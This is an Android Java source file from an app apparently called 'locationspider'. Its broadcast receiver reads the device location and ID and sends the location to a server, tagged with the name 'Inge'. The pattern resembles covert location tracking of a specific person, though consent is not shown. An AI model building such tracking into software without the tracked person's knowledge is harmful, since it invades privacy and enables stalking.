package com.benziedroid.locationspider;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;

public class location extends BroadcastReceiver {

	Location location;
	String deviceID;
	
	
	@Override
	public void onReceive(Context arg0, Intent arg1) {
		// TODO Auto-generated method stub
		
		DeviceInfoProvider deviceInfo = new DeviceInfoProvider(arg0);
		location = deviceInfo.getLocation(); 
		deviceID = deviceInfo.getDevideId();
		
		SendToServerTask sendToServer = new SendToServerTask("Inge", location);
		sendToServer.execute();
		
		
	}
	

}
